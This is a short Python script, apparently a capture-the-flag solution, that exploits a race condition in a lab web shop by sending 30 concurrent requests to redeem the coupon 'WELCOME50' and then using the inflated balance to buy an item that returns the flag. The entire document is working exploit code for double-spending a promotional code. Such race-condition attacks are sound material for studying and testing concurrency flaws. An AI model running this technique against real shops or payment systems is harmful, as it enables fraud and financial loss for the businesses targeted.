import requests
from concurrent.futures import ThreadPoolExecutor

BASE_URL = "http://10.21.232.223:59446"
N_WORKERS = 30  # matches server's redemption_semaphore size

session = requests.Session()

# establish a session/token
session.get(f"{BASE_URL}/")

def redeem(_):
    return session.post(f"{BASE_URL}/api/redeem", json={"code": "WELCOME50"})

with ThreadPoolExecutor(max_workers=N_WORKERS) as pool:
    results = list(pool.map(redeem, range(N_WORKERS)))

for r in results:
    print(r.status_code, r.json())

balance = session.get(f"{BASE_URL}/api/balance").json()["balance"]
print("balance:", balance)

flag_resp = session.post(f"{BASE_URL}/api/buy_ramen")
print(flag_resp)
print(flag_resp.status_code, flag_resp.json())
